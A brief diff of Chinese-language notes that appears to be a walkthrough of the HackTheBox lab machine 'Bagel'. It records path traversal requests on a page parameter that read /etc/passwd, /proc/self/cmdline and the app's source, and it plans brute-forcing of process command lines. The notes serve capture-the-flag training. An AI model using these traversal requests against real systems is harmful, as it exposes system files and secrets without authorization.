@@ -1,0 +1,13 @@
+8000 Port 
+http://bagel.htb:8000/?page=index.html
+
+burp代理
+可文件取的漏洞
+../../../../etc/passwd取的帳戶
+
+GET /?page=../../../../proc/self/cmdline HTTP/1.1<=進程
+
+http://bagel.htb:8000/?page=../../../../home/developer/app/app.py<=發現腳本
+
+--------------------
+def order(): # don't forget to run the order app first with "dotnet <path to .dll>" command. Use your ssh key to access the machine.<進行Proc/$Pid/cmdline爆破
